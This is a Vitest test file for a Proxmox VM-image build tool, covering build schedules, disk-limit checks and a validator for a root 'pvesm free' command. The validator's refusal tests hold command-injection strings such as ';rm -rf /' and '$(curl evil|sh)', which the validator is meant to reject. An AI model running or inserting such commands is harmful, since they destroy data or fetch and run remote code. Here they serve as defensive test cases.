import { describe, expect, it } from "vitest";
import {
  bytesText,
  diskLimitText,
  diskUse,
  newestReady,
  nextSlot,
  overLimit,
  safeFreeCommand,
  scheduleText,
  smallestDisk,
} from "./images";
import type { ImageStatus, ImageVersion } from "./types";

const at = (iso: string) => new Date(iso);

describe("schedule (D-210)", () => {
  it.each([
    [{ every: "day", at: "03:00" }, "Every day at 03:00 UTC"],
    [{ every: "week", weekday: "sun", at: "03:00" }, "Every Sunday at 03:00 UTC"],
    [{ every: "month", day: 28, at: "23:59" }, "On day 28 of every month at 23:59 UTC"],
  ] as const)("%#: text", (s, text) => expect(scheduleText(s)).toBe(text));

  it("has no text without a schedule", () => expect(scheduleText(undefined)).toBe("No schedule"));

  it.each([
    // day: today when the time is still ahead, else tomorrow
    [{ every: "day", at: "03:00" }, "2026-11-11T02:59:00Z", "2026-11-11T03:00:00.000Z"],
    [{ every: "day", at: "03:00" }, "2026-11-11T03:00:00Z", "2026-11-12T03:00:00.000Z"],
    // 2026-11-11 is a Wednesday
    [
      { every: "week", weekday: "sun", at: "03:00" },
      "2026-11-11T12:00:00Z",
      "2026-11-15T03:00:00.000Z",
    ],
    [
      { every: "week", weekday: "wed", at: "03:00" },
      "2026-11-11T12:00:00Z",
      "2026-11-18T03:00:00.000Z",
    ],
    [
      { every: "week", weekday: "wed", at: "13:00" },
      "2026-11-11T12:00:00Z",
      "2026-11-11T13:00:00.000Z",
    ],
    // month: across the end of the year
    [{ every: "month", day: 1, at: "00:00" }, "2026-12-15T00:00:00Z", "2027-01-01T00:00:00.000Z"],
    [{ every: "month", day: 15, at: "06:00" }, "2026-12-15T05:00:00Z", "2026-12-15T06:00:00.000Z"],
  ] as const)("%#: next slot after %s", (s, now, next) => {
    expect(nextSlot(s, at(now)).toISOString()).toBe(next);
  });
});

describe("disk use (D-203)", () => {
  const d = {
    storage: "local-lvm",
    total_bytes: 100 * 2 ** 30,
    used_bytes: 60 * 2 ** 30,
    reserved_bytes: 10 * 2 ** 30,
    limit_percent: 85,
  };
  it("counts the running builds and the new disk", () => {
    expect(diskUse(d, 10)).toMatchObject({ now: 70, after: 80, over: false });
    expect(diskUse(d, 16)).toMatchObject({ after: 86, over: true });
    expect(diskUse(d).text).toBe(
      "local-lvm: 60.0 GiB of 100.0 GiB used (60 %), 10.0 GiB held by running builds of all images.",
    );
  });
  it("gives the reason of answer 7", () => {
    expect(diskLimitText(d, 16)).toBe(
      "A build does not start when local-lvm would be more than 85 % full with the whole build disk. With this build: 86 %.",
    );
  });
  it("does not divide by zero", () => {
    expect(diskUse({ ...d, total_bytes: 0 }, 10).after).toBe(0);
    expect(diskUse({ ...d, total_bytes: 0 }, 10).over).toBe(true); // unknown size: refused
  });
});

describe("versions", () => {
  const v = (version: number, status: ImageVersion["status"]) =>
    ({ version, status }) as ImageVersion;
  it("finds the newest ready version", () => {
    const st = { versions: [v(4, "building"), v(3, "failed"), v(1, "ready"), v(2, "ready")] };
    expect(newestReady(st as ImageStatus)?.version).toBe(2);
    expect(newestReady(undefined)).toBeNull();
    expect(newestReady({ versions: [v(1, "removed")] } as ImageStatus)).toBeNull();
  });
  it("formats sizes", () => {
    expect(bytesText(612368384)).toBe("584 MiB");
    expect(bytesText(1.5 * 2 ** 30)).toBe("1.5 GiB");
  });
  it("gives the smallest disk only for a built image", () => {
    expect(smallestDisk(undefined)).toBeNull();
    expect(smallestDisk({ type: "vm", url: "https://x", sha256: "a".repeat(64) })).toBeNull();
    expect(
      smallestDisk({
        type: "vm",
        url: "https://x",
        sha256: "a".repeat(64),
        build: { guest: { disk: 10, bridge: "vmbr0" } },
      }),
    ).toBe(10);
  });
});

describe("root command of an unused import file (review S1, PR #123)", () => {
  const good = "pvesm free plumb-images:import/plumb-ubuntu-web-0b1c2d3e4f5a.qcow2";
  it("offers only Plumb's own form", () => {
    expect(safeFreeCommand(good)).toBe(good);
    expect(safeFreeCommand("pvesm free local:import/plumb-a.b-0123456789ab.qcow2")).not.toBeNull();
  });
  it.each([
    "pvesm free plumb-images:import/plumb-x;rm -rf /-0b1c2d3e4f5a.qcow2",
    "pvesm free plumb-images:import/plumb-$(curl evil|sh)-0b1c2d3e4f5a.qcow2",
    "pvesm free plumb-images:import/plumb-a b-0b1c2d3e4f5a.qcow2",
    "pvesm free plumb-images:import/plumb-'a'-0b1c2d3e4f5a.qcow2",
    'pvesm free plumb-images:import/plumb-"a"-0b1c2d3e4f5a.qcow2',
    "pvesm free plumb-images:import/plumb-a-0b1c2d3e4f5a.qcow2; reboot",
    "pvesm free plumb-images:import/plumb-a-0b1c2d3e4f5a.qcow2\nreboot",
    "pvesm free plumb-images:import/other-0b1c2d3e4f5a.qcow2",
    "pvesm free plumb-images:import/plumb-a-0B1C2D3E4F5A.qcow2",
    "pvesm free plumb-images:import/plumb-a-0b1c2d3e4f5.qcow2",
    "pvesm free plumb-images:images/plumb-a-0b1c2d3e4f5a.qcow2",
    "pvesm free plumb-images:import/../plumb-a-0b1c2d3e4f5a.qcow2",
    " pvesm free plumb-images:import/plumb-a-0b1c2d3e4f5a.qcow2",
    "sudo pvesm free plumb-images:import/plumb-a-0b1c2d3e4f5a.qcow2",
    "",
  ])("refuses %j", (cmd) => {
    expect(safeFreeCommand(cmd)).toBeNull();
  });
  it("refuses a missing command", () => {
    expect(safeFreeCommand(null)).toBeNull();
    expect(safeFreeCommand(undefined)).toBeNull();
  });
});

describe("exact 85 % rule (QA of PR #123)", () => {
  const GIB = 2 ** 30;
  const d = (used: number) => ({
    storage: "local-lvm",
    total_bytes: 100 * GIB,
    used_bytes: used,
    reserved_bytes: 0,
    limit_percent: 85,
  });
  it("85.0 % is allowed, 85.01 % is refused", () => {
    expect(diskUse(d(75 * GIB), 10).over).toBe(false); // exactly 85 %
    const u = diskUse(d(75 * GIB + GIB / 100), 10); // 85.01 %
    expect(u.over).toBe(true);
    expect(u.after).toBeGreaterThan(85); // never shows "85 %" for a refused build
    expect(diskUse(d(75 * GIB + 0.4 * GIB), 10).over).toBe(true); // 85.4 %: no rounding down
  });
  it("one byte over the limit is refused, in integer math", () => {
    expect(overLimit(85, 100, 85)).toBe(false);
    expect(overLimit(86, 100, 85)).toBe(true);
    const total = 20 * 2 ** 48; // exact; × 100 passes 2^53
    const limit = 17 * 2 ** 48; // exactly 85 %
    expect(overLimit(limit, total, 85)).toBe(false);
    expect(overLimit(limit + 1, total, 85)).toBe(true);
  });
});
